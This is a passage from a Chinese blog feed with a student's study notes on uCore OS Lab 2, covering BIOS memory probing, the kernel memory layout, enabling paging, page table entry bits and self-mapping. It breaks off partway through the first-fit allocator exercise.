<p><strong>实现不考虑实现开销和效率的LRU页替换算法</strong></p>
</blockquote>
<p>遇到了一个较为麻烦的问题：如何在正常访问内存时设置<code>swap_manager</code>中相关链表上物理页的LRU，留坑…</p>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab2</title>
    <url>/2020/08/uCore-2/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 2时写下的一些笔记</li>
<li>内容涉及段页式存储管理、页机制以及uCore页目录与页表结构等</li>
<li>内容较多，建议使用右侧导航栏。</li>
</ul>
<a id="more"></a>
<h2 id="1-知识点">1. 知识点</h2>
<h3 id="1-物理内存探测">1) 物理内存探测</h3>
<ul>
<li>
<p>操作系统需要知道了解整个计算机系统中的物理内存如何分布的，哪些被可用，哪些不可用。其基本方法是通过BIOS中断调用来帮助完成的。<code>bootasm.S</code>中新增了一段代码，使用BIOS中断检测物理内存总大小。</p>
</li>
<li>
<p>在讲解该部分代码前，先引入一个结构体</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e820map</span> &#123;</span>      <span class="comment">// 该数据结构保存于物理地址0x8000</span></span><br><span class="line">    <span class="keyword">int</span> nr_map;       <span class="comment">// map中的元素个数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint64_t</span> addr;    <span class="comment">// 某块内存的起始地址</span></span><br><span class="line">        <span class="keyword">uint64_t</span> size;    <span class="comment">// 某块内存的大小</span></span><br><span class="line">        <span class="keyword">uint32_t</span> type;    <span class="comment">// 某块内存的属性。1标识可被使用内存块；2表示保留的内存块，不可映射。</span></span><br><span class="line">    &#125; __attribute__((packed)) <span class="built_in">map</span>[E820MAX];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下是bootasm.S中新增的代码，详细信息均以注释的形式写入代码中。</p>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">probe_memory:</span></span><br><span class="line">    movl <span class="number">$0</span>, <span class="number">0x8000</span>   # 初始化，向内存地址<span class="number">0x8000</span>，即uCore结构e820map中的成员nr_map中写入<span class="number">0</span></span><br><span class="line">    xorl %ebx, %ebx   # 初始化%ebx为<span class="number">0</span>，这是<span class="keyword">int</span> <span class="number">0x15</span>的其中一个参数</span><br><span class="line">    movw <span class="number">$0</span>x8004, %di # 初始化%di寄存器，使其指向结构e820map中的成员数组map</span><br><span class="line"><span class="symbol">start_probe:</span></span><br><span class="line">    movl <span class="number">$0</span>xE820, %eax  # BIOS <span class="number">0x15</span>中断的子功能编号 %eax == <span class="number">0xE820</span></span><br><span class="line">    movl <span class="number">$20</span>, %ecx    # 存放地址范围描述符的内存大小，至少<span class="number">20</span></span><br><span class="line">    movl $SMAP, %edx  # 签名， %edx == 0x534D4150h(<span class="string">"SMAP"</span>字符串的ASCII码)</span><br><span class="line">    <span class="keyword">int</span> <span class="number">$0</span>x15     # 调用<span class="number">0x15</span>中断</span><br><span class="line">    <span class="keyword">jnc</span> cont      # 如果该中断执行失败，则CF标志位会置<span class="number">1</span>，此时要通知UCore出错</span><br><span class="line">    movw <span class="number">$12345</span>, <span class="number">0x8000</span> # 向结构e820map中的成员nr_map中写入特殊信息，报告当前错误</span><br><span class="line">    <span class="keyword">jmp</span> finish_probe    # 跳转至结束，不再探测内存</span><br><span class="line"><span class="symbol">cont:</span></span><br><span class="line">    addw <span class="number">$20</span>, %di   # 如果中断执行正常，则目标写入地址就向后移动一个位置</span><br><span class="line">    incl <span class="number">0x8000</span>     # e820::nr_map++</span><br><span class="line">    cmpl <span class="number">$0</span>, %ebx   # 执行中断后，返回的%ebx是原先的%ebx加一。如果%ebx为<span class="number">0</span>，则说明当前内存探测完成</span><br><span class="line">    <span class="keyword">jnz</span> start_probe</span><br><span class="line"><span class="symbol">finish_probe:</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>这部分代码执行完成后，从BIOS中获得的内存分布信息以结构体<code>e820map</code>的形式写入至物理<code>0x8000</code>地址处。稍后ucore的page_init函数会访问该地址并处理所有的内存信息。</p>
</li>
</ul>
<h3 id="2-链接地址">2) 链接地址</h3>
<ul>
<li>
<p>审计<code>lab2/tools/kernel.ld</code>这个链接脚本，我们可以很容易的发现，链接器设置kernel的链接地址(link address)为<code>0xC0100000</code>，这是个虚拟地址。在uCore的bootloader中，bootloader使用如下语句来加载kernel：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure>
<p><code>0xC0010000 &amp; 0xFFFFFF == 0x00100000</code>即kernel最终被装载入物理地址<code>0x10000</code>处，其相对偏移为<code>-0xc0000000</code>，与uCore中所设置的虚拟地址的偏移量相对应。</p>
</li>
<li>
<p>需要注意的是，在lab2的一些代码中会使用到如下两个变量，但这两个变量并没有被定义在任何C语言的源代码中：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> end[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> edata[];</span><br></pre></td></tr></table></figure>
<p>实际上，它们定义于<code>kernel.ld</code>这个链接脚本中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">. = ALIGN(<span class="number">0x1000</span>);</span><br><span class="line">.data.pgdir : &#123;</span><br><span class="line">    *(.data.pgdir)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROVIDE(edata = .);</span><br><span class="line"></span><br><span class="line">.bss : &#123;</span><br><span class="line">    *(.bss)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROVIDE(end = .);</span><br><span class="line"></span><br><span class="line">/DISCARD/ : &#123;</span><br><span class="line">    *(.eh_frame .note.GNU-<span class="built_in">stack</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 脚本文件的结尾</span></span><br></pre></td></tr></table></figure>
<p><code>edata</code>表示<code>kernel</code>的<code>data</code>段结束地址；<code>end</code>表示<code>bss</code>段的结束地址（即整个<code>kernel</code>的结束地址）</p>
<p><code>edata[]</code>和 <code>end[]</code>这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。</p>
</li>
</ul>
<h3 id="3-uCore的内存空间布局">3) uCore的内存空间布局</h3>
<ul>
<li>
<p>在uCore中，CPU先在bootasm.S（实模式）中通过调用BIOS中断，将物理内存的相关描述符写入特定位置<code>0x8000</code>，然后读入kernel至物理地址<code>0x10000</code>、虚拟地址<code>0xC0000000</code>。</p>
</li>
<li>
<p>而kernel在<code>page_init</code>函数中，读取物理内存地址<code>0x8000</code>处的内存，查找最大物理地址，并计算出所需的<strong>页面数</strong>。虚拟页表<code>VPT(Virtual Page Table)</code>的地址紧跟<code>kernel</code>，其地址为4k对齐。虚拟地址空间结构如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Virtual memory map:                                          Permissions</span></span><br><span class="line"><span class="comment"> *                                                              kernel/user</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     4G -----------&gt; +---------------------------------+</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     |         Empty Memory (*)        |</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     +---------------------------------+ 0xFB000000</span></span><br><span class="line"><span class="comment"> *                     |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span></span><br><span class="line"><span class="comment"> *     VPT ----------&gt; +---------------------------------+ 0xFAC00000</span></span><br><span class="line"><span class="comment"> *                     |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     KERNTOP ------&gt; +---------------------------------+ 0xF8000000</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     |    Remapped Physical Memory     | RW/-- KMEMSIZE</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *     KERNBASE -----&gt; +---------------------------------+ 0xC0000000</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     |                                 |</span></span><br><span class="line"><span class="comment"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="comment"> * (*) Note: The kernel ensures that "Invalid Memory" is *never* mapped.</span></span><br><span class="line"><span class="comment"> *     "Empty Memory" is normally unmapped, but user programs may map pages</span></span><br><span class="line"><span class="comment"> *     there if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br></pre></td></tr></table></figure>
<p>完成<strong>物理内存页管理初始化工作</strong>后，其物理地址的分布空间如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">+----------------------+ &lt;- <span class="number">0xFFFFFFFF</span>(<span class="number">4</span>GB)       ----------------------------  <span class="number">4</span>GB</span><br><span class="line">|  一些保留内存，例如用于|                                保留空间</span><br><span class="line">|   <span class="number">32b</span>it设备映射空间等  |</span><br><span class="line">+----------------------+ &lt;- 实际物理内存空间结束地址 ----------------------------</span><br><span class="line">|                      |</span><br><span class="line">|                      |</span><br><span class="line">|     用于分配的         |                                 可用的空间</span><br><span class="line">|    空闲内存区域        |</span><br><span class="line">|                      |</span><br><span class="line">|                      |</span><br><span class="line">|                      |</span><br><span class="line">+----------------------+ &lt;- 空闲内存起始地址      ----------------------------  </span><br><span class="line">|     VPT页表存放位置      |                                VPT页表存放的空间   (<span class="number">4</span>MB左右)</span><br><span class="line">+----------------------+ &lt;- bss段结束处           ----------------------------</span><br><span class="line">|uCore的text、data、bss |                              uCore各段的空间</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x00100000</span>(<span class="number">1</span>MB)       ---------------------------- <span class="number">1</span>MB</span><br><span class="line">|       BIOS ROM       |</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x000F0000</span>(<span class="number">960</span>KB)</span><br><span class="line">|     <span class="number">16b</span>it设备扩展ROM  |                             显存与其他ROM映射的空间</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x000C0000</span>(<span class="number">768</span>KB)</span><br><span class="line">|     CGA显存空间       |</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x000B8000</span>            ---------------------------- <span class="number">736</span>KB</span><br><span class="line">|        空闲内存       |</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x00011000</span>(+<span class="number">4</span>KB)          uCore header的内存空间</span><br><span class="line">| uCore的ELF header数据 |</span><br><span class="line">+----------------------+ &lt;<span class="number">-0x00010000</span>             ---------------------------- <span class="number">64</span>KB</span><br><span class="line">|       空闲内存        |</span><br><span class="line">+----------------------+ &lt;- 基于bootloader的大小          bootloader的</span><br><span class="line">|      bootloader的   |                                    内存空间</span><br><span class="line">|     text段和data段    |</span><br><span class="line">+----------------------+ &lt;- <span class="number">0x00007C00</span>            ---------------------------- <span class="number">31</span>KB</span><br><span class="line">|   bootloader和uCore  |</span><br><span class="line">|      共用的堆栈       |                                 堆栈的内存空间</span><br><span class="line">+----------------------+ &lt;- 基于栈的使用情况</span><br><span class="line">|     低地址空闲空间    |</span><br><span class="line">+----------------------+ &lt;-  <span class="number">0x00000000</span>           ---------------------------- <span class="number">0</span>KB</span><br></pre></td></tr></table></figure>
<p>易知，其页表地址之上的物理内存空间是空闲的（除去保留的内存），故将该物理地址之下的物理空间对应的页表全部设置为保留(reserved)。并将这些空闲的内存全部添加进页表项中。</p>
</li>
</ul>
<h3 id="4-段页式存储管理（重要）">4. 段页式存储管理（重要）</h3>
<blockquote>
<p>在保护模式中，x86 体系结构将内存地址分成三种：<strong>逻辑地址</strong>（也称<strong>虚拟地址</strong>）、<strong>线性地址</strong>和<strong>物理地址</strong>。</p>
</blockquote>
<ul>
<li>段式存储在内存保护方面有优势，页式存储在内存利用和优化转移到后备存储方面有优势。</li>
<li>在段式存储管理基础上，给每个段加一级页表。同时，通过指向相同的页表基址，实现进程间的段共享。</li>
<li>在段页式管理中，操作系统弱化了段式管理中的功能，实现以分页为主的内存管理。段式管理只起到了一个过滤的作用，它将地址不加转换直接映射成线性地址。将虚拟地址转换为物理地址的过程如下：
<ul>
<li>根据段寄存器中的段选择子，获取GDT中的特定基址并加上目标偏移来确定<strong>线性地址</strong>。由于GDT中所有的基址全为0（因为弱化了段式管理的功能，对等映射），所以此时的逻辑地址和线性地址是相同的。</li>
<li>根据该线性地址，获取对应页表项，并根据该页表项来获取对应的物理地址。</li>
</ul>
</li>
<li><strong>一级页表（页目录表PageDirectoryTable, PDT）的起始地址存储于<code>%cr3</code>寄存器中。</strong></li>
</ul>
<h4 id="a-启动页机制（重要）">a. 启动页机制（重要）</h4>
<p>启动页机制的代码很简单，其对应的汇编代码为</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"># labcodes/lab2/kern/init/entry<span class="number">.</span>S</span><br><span class="line"><span class="symbol">kern_entry:</span></span><br><span class="line">    # load pa of boot pgdir</span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3</span><br><span class="line">    # enable paging</span><br><span class="line">    movl %cr0, %eax</span><br><span class="line">    orl $(CR0_PE | CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_TS | CR0_EM | CR0_MP), %eax</span><br><span class="line">    andl $~(CR0_TS | CR0_EM), %eax</span><br><span class="line">    movl %eax, %cr0</span><br><span class="line"></span><br><span class="line">    # update <span class="built_in">eip</span></span><br><span class="line">    # now, <span class="built_in">eip</span> = 0x1xxxxx</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set <span class="built_in">eip</span> = KERNBASE + 0x1xxxxx</span><br><span class="line">    <span class="keyword">jmp</span> *%eax</span><br><span class="line"><span class="symbol">next:</span></span><br><span class="line">  # .....省略剩余代码</span><br><span class="line"></span><br><span class="line"># kernel builtin pgdir</span><br><span class="line"># an initial page directory (Page Directory Table, PDT)</span><br><span class="line"># These page directory table <span class="keyword">and</span> page table can be reused!</span><br><span class="line"><span class="meta">.section</span> .data<span class="number">.</span>pgdir</span><br><span class="line"><span class="meta">.align</span> PGSIZE</span><br><span class="line"><span class="symbol">__boot_pgdir:</span></span><br><span class="line"><span class="meta">.globl</span> __boot_pgdir</span><br><span class="line">    # map va <span class="number">0</span> ~ 4M to pa <span class="number">0</span> ~ 4M (temporary)</span><br><span class="line"><span class="meta">    .long</span> REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line"><span class="meta">    .space</span> (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; <span class="number">10</span> &lt;&lt; <span class="number">2</span>) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (<span class="number">0</span> ~ 4M) to pa <span class="number">0</span> ~ 4M</span><br><span class="line"><span class="meta">    .long</span> REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line"><span class="meta">    .space</span> PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line"></span><br><span class="line"><span class="meta">.set</span> i, <span class="number">0</span></span><br><span class="line"><span class="symbol">__boot_pt1:</span></span><br><span class="line"><span class="meta">.rept</span> <span class="number">1024</span></span><br><span class="line"><span class="meta">    .long</span> i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line"><span class="meta">    .set</span> i, i + <span class="number">1</span></span><br><span class="line"><span class="meta">.endr</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>首先，将一级页表 <strong>__boot_pgdir</strong>  （页目录表PDT）的<strong>物理</strong>基地址加载进<code>%cr3</code>寄存器中。</p>
<ul>
<li>
<p>该一级页表<strong>暂时</strong>将虚拟地址 <strong>0xC0000000 + (0~4M)</strong> 以及虚拟地址 <strong>(0~4M)</strong>   设置为物理地址 <strong>(0-4M)</strong> 。</p>
<p>之后会重新设置一级页表的映射关系。</p>
<blockquote>
<p>为什么要将两段虚拟内存映射到同一段物理地址呢？思考一下，答案就在下方。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>之后，设置<code>%cr0</code>寄存器中<strong>PE、PG、AM、WP、NE、MP</strong>位，关闭<strong>TS</strong> 与<strong>EM</strong> 位，以启动分页机制。</p>
<blockquote>
<p>先介绍一下<code>%cr0</code>寄存器主要3个标志位的功能：</p>
<ul>
<li><strong>P</strong>rotection <strong>E</strong>nable: 启动保护模式，默认只是打开分段。</li>
<li><strong>P</strong>a<strong>g</strong>ing: 设置分页标志。只有PE和PG位同时置位，才能启动分页机制。</li>
<li><strong>W</strong>rite <strong>P</strong>rotection: 当该位为1时，CPU会禁止ring0代码向read only page写入数据。这个标志位主要与<strong>写时复制</strong>有关系。</li>
</ul>
<p>除<strong>PE</strong>、<strong>PG</strong>与<strong>WP</strong> 的<strong>其他</strong>标志位与分页机制关联不大，其设置或清除的原因盲猜可能是通过启动分页机制这个机会来<strong>顺便做个初始化</strong>。</p>
</blockquote>
<blockquote>
<p>当改变PE和PG位时，必须小心。只有<strong>当执行程序至少有部分代码和数据在线性地址空间和物理地址空间中具有相同地址时，我们才能改变PG位的设置</strong>。</p>
<p>因为当<code>%cr0</code>寄存器一旦设置，则<strong>分页机制立即开启</strong>。此时这部分具有相同地址的代码在分页和未分页之间起着桥梁的作用。无论是否开启分页机制，这部分代码都必须具有相同的地址。</p>
<p>而这一步的操作能否成功，关键就在于一级页表的设置。一级页表将虚拟内存中的两部分地址<strong>KERNBASE+(0-4M)</strong> 与 <strong>(0-4M)</strong> 暂时都映射至物理地址 <strong>(0-4M)</strong> 处，这样就可以满足上述的要求。</p>
</blockquote>
</li>
<li>
<p>最后，<strong>必须</strong>来个简单的<code>jmp</code>指令，将<code>eip</code>从物理地址“修改”为虚拟地址。</p>
<blockquote>
<p>在修改该了PE位之后程序必须立刻使用一条跳转指令，以刷新处理器执行管道中已经获取的不同模式下的任何指令。</p>
</blockquote>
</li>
</ul>
<h4 id="b-uCore段页机制启动过程">b. uCore段页机制启动过程</h4>
<ul>
<li>bootloader在启动保护模式前，会设置一个临时GDT以便于进入CPU保护模式后的bootloader和uCore所使用。</li>
<li>uCore被bootloader加载进内存后，在<code>kern_entry</code>中启动页机制。</li>
<li>在<code>pmm_init</code>中建立双向链表来管理物理内存，并设置一级页表（页目录表）与二级页表。</li>
<li>最后重新加载新的GDT。</li>
</ul>
<blockquote>
<p>lab2相对于lab1，新增了页机制相关的处理过程，其他过程没有改变。</p>
</blockquote>
<h4 id="c-uCore物理页结构">c. uCore物理页结构</h4>
<ul>
<li>
<p>uCore中用于管理物理页的结构如下所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment">* struct Page - Page descriptor structures. Each Page describes one</span></span><br><span class="line"><span class="comment">* physical page. In kern/mm/pmm.h, you can find lots of useful functions</span></span><br><span class="line"><span class="comment">* that convert Page to other data types, such as phyical address.</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> ref;                <span class="comment">// 当前页被引用的次数，与内存共享有关</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;         <span class="comment">// 标志位的集合，与eflags寄存器类似</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> property;  <span class="comment">// 空闲的连续page数量。这个成员只会用在连续空闲page中的第一个page</span></span><br><span class="line">  <span class="keyword">list_entry_t</span> page_link; <span class="comment">// 两个分别指向上一个和下一个非连续空闲页的指针。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>目前在lab2中，flags可以设置的位只有<code>reserved</code>位和<code>Property</code>位。</p>
<blockquote>
<p><code>reserved</code>位表示当前页是否被保留，一旦保留该页，则该页无法用于分配；</p>
<p><code>Property</code>位表示当前页是否已被分配，为1则表示已分配。</p>
</blockquote>
</li>
<li>
<p>所有的数据结构Page都存放在<strong>一维Page结构数组</strong>中。但请注意，这并非虚拟页表（VPT），即该<strong>一维Page结构数组并非分页机制用于<em>将虚拟地址转换为物理地址</em>这个过程所用到的一级与二级页表</strong>，它们只是用于设置对应物理页表的相关属性，例如当前物理页表被二级页表的引用次数等等。</p>
</li>
<li>
<p>同时，该一维Page结构数组的存储位置与虚拟页表VPT的存储位置不同。前者的起始存储地址为kernel结尾地址向上4k对齐后的第一个物理页面，而后者则存储于指定虚拟地址<code>0xFAC00000</code>。</p>
</li>
<li>
<p>页目录表使用<strong>线性地址</strong>的首部(PDX, 10bit)作为索引，二级页表使用<strong>线性地址</strong>的中部(PTX, 10bit)作为索引，而Page结构数组使用<strong>物理地址</strong>的首部与中部(PPN, 20bit)作为索引（注意是<strong>物理</strong>地址）。</p>
</li>
<li>
<p>为了加快查找，所有连续空闲pages中的第一个Page结构都会构成一个双向链表。相互链接，其第一个结点是<code>free_area.free_list</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* free_area_t - maintains a doubly linked list to record free (unused) pages */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">list_entry_t</span> free_list;         <span class="comment">// the list header</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_free;           <span class="comment">// # of free pages in this free list</span></span><br><span class="line">&#125; <span class="keyword">free_area_t</span>;</span><br><span class="line"><span class="keyword">free_area_t</span> free_area;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="d-虚拟页表结构">d. 虚拟页表结构</h4>
<p>每个页表项（PTE）都由一个32位整数来存储数据，其结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">      <span class="number">31</span><span class="number">-12</span>      <span class="number">9</span><span class="number">-11</span>     <span class="number">8</span>    <span class="number">7</span>    <span class="number">6</span>   <span class="number">5</span>   <span class="number">4</span>      <span class="number">3</span>    <span class="number">2</span>   <span class="number">1</span>   <span class="number">0</span></span><br><span class="line">+--------------+-------+-----+----+---+---+-----+-----+---+---+---+</span><br><span class="line">|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |</span><br><span class="line">+--------------+-------+-----+----+---+---+-----+-----+---+---+---+</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>0 - <strong>P</strong>resent: 表示当前PTE所指向的物理页面是否驻留在内存中</p>
</li>
<li>
<p>1 - <strong>W</strong>riteable: 表示是否允许读写</p>
</li>
<li>
<p>2 - <strong>U</strong>ser: 表示该页的访问所需要的特权级。即User(ring 3)是否允许访问</p>
</li>
<li>
<p>3 - <strong>P</strong>age<strong>W</strong>rite<strong>T</strong>hough:  表示是否使用write through缓存写策略</p>
</li>
<li>
<p>4 - <strong>P</strong>age<strong>C</strong>ache<strong>D</strong>isable: 表示是否<strong>不对</strong>该页进行缓存</p>
</li>
<li>
<p>5 - <strong>A</strong>ccess: 表示该页是否已被访问过</p>
</li>
<li>
<p>6 - <strong>D</strong>irty: 表示该页是否已被修改</p>
</li>
<li>
<p>7 - <strong>P</strong>age<strong>S</strong>ize: 表示该页的大小</p>
</li>
<li>
<p>8 - <strong>M</strong>ust<strong>B</strong>e<strong>Z</strong>ero: 该位必须保留为0</p>
</li>
<li>
<p>9-11 - <strong>Avail</strong>able: 第9-11这三位并没有被内核或中断所使用，可保留给OS使用。</p>
</li>
<li>
<p>12-31 - Offset: 目标地址的后20位。</p>
<blockquote>
<p>因为目标地址以4k作为对齐标准，所以该地址的低12位永远为0，故这12位空间可用于设置标志位。</p>
</blockquote>
</li>
</ul>
<h4 id="e-自映射">e. 自映射</h4>
<ul>
<li>
<p>自映射的好处</p>
<ul>
<li>当页目录与页表建立完成后，如果需要按虚拟地址的地址<strong>顺序显示整个页目录表和页表的内容</strong>，则要查找页目录表的页目录表项内容，并根据页目录表项内容找到页表的物理地址，再转换成对应的虚地址，然后访问页表的虚地址，搜索整个页表的每个页目录项。这样的过程比较繁琐，而自映射可以改善这个过程。</li>
<li>节省4KB空间</li>
<li>方便用户态程序访问页表，可以用这种方式实现一个用户地址空间的映射</li>
</ul>
</li>
<li>
<p>页表自映射的关键点</p>
<ul>
<li>
<p>把所有的页表（4KB * 1024个）放到<strong>连续</strong>的4MB <strong>虚拟地址</strong> 空间中，并且要求这段空间4MB对齐，这样，<strong>就会有一张虚拟页的内容与页目录的内容完全相同</strong>。</p>
</li>
<li>
<p>页目录结构必须和页表结构相同。</p>
</li>
<li>
<p>此时在页目录表中，会存在一个页目录条目，该页目录条目指向某个二级页表。而该二级页表的物理地址，正是页目录表所处于物理页的<strong>物理</strong>地址。</p>
<p>即，页目录表中存在一个页目录条目，该条目内含的物理地址就是页目录表本身的物理地址。</p>
<p>uCore中的这条代码证实了这个结论:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// recursively insert boot_pgdir in itself</span></span><br><span class="line"><span class="comment">// to form a virtual page table at virtual address VPT</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PDX(VPT)为4MB虚拟页表所对应的PageDirectoryIndex</span></span><br><span class="line">boot_pgdir[PDX(VPT)] = PADDR(boot_pgdir) | PTE_P | PTE_W;</span><br></pre></td></tr></table></figure>
<p>而下面这张图演示了其指向过程:</p>
<blockquote>
<p>注意页目录表此时存储于VPT的4MB范围中。</p>
</blockquote>
<pre class="mermaid">    graph LR;
PDT-->PT1
PDT-->PT2/PDT
PT1-->PhyPage1
PT1-->PhyPage2
PT2/PDT-->PhyPage3/PT1
PT2/PDT-->PhyPage4/PT2</pre>
</li>
</ul>
</li>
<li>
<p>参考：<a href="https://blog.csdn.net/u010513059/article/details/80311248" target="_blank" rel="noopener">页表自映射</a></p>
</li>
</ul>
<h3 id="5-uCore栈的迁移">5) uCore栈的迁移</h3>
<ul>
<li>
<p>在原先的lab1中，bootloader所设置的栈起始地址为<code>0x7c00</code>，之后的uCore的代码也沿用了这个栈，但仍然划分出了一个全局数组作为TSS上的ring0栈地址（该全局数组位于uCore的bss段）。</p>
<blockquote>
<p>注意此时的<strong>两个</strong>内核栈是不一样的，一个是中断外使用的栈，另一个是中断内使用的栈。</p>
</blockquote>
</li>
<li>
<p>而在lab2中，栈稍微做了一些改变。bootloader所设置的栈起始地址仍然为<code>0x7c00</code>，但在将uCore加载进内存之后，在<code>kern_entry</code>中，该部分代码在启动页机制后将栈设置为uCore data段上的一个全局数组的末尾地址<code>bootstacktop</code>（8KB），并也在<code>gdt_init</code>将TSS ring0栈地址设置为了<code>bootstacktop</code>。</p>
<blockquote>
<p>与Lab1不同，之后内核可以使用的内核栈只有一个。</p>
</blockquote>
<blockquote>
<p>中断处理程序可能会从高地址开始，向下覆盖ring3的栈数据。这个漏洞可能是因为未完全实现的内存管理机制所导致的。</p>
</blockquote>
</li>
</ul>
<h2 id="2-练习解答">2. 练习解答</h2>
<h3 id="1-练习0">1) 练习0</h3>
<blockquote>
<p><strong>填写已有实验</strong>，将完成的实验1中的代码添加进实验2中。</p>
</blockquote>
<p>这个没什么好说的，一个个照搬就成。</p>
<h3 id="2-练习1">2) 练习1</h3>
<blockquote>
<p><strong>实现 first-fit 连续物理内存分配算法</strong>。</p>
</blockquote>
<p>原先的uCore实验2代码中几乎已经完全实现了first-fit算法，但其中仍然存在一个问题，以至于无法通过check。什么问题呢：</p>
<blockquote>
<p><code>first-fit</code>算法要求将空闲内存块<strong>按照地址从小到大的方式</strong>连起来。</p>
</blockquote>
<p>但uCore中的代码没有实现这一点。所以要手动修改相关的代码。</p>
<ul>
<li>
<p><code>default_init_memmap</code></p>
<ul>
<li>
<p>该函数将新页面插入链表时，没有按照地址顺序插入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">list_add(&amp;free_list, &amp;(base-&gt;page_link));</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>故需要修改该行代码，使其按地址顺序插入至双向链表中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">list_add_before(&amp;free_list, &amp;(base-&gt;page_link));</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>default_alloc_pages</code></p>
<ul>
<li>
<p>在原先的代码中，当获取到了一个大小足够大的页面地址时，程序会先将该页头从链表中断开，切割，并将剩余空间放回链表中。但将<em>剩余空间放回链表</em>时，并没有按照地址顺序插入链表。</p>
<blockquote>
<p>连续空闲页面中的第一个页称为页头，page header。</p>
</blockquote>
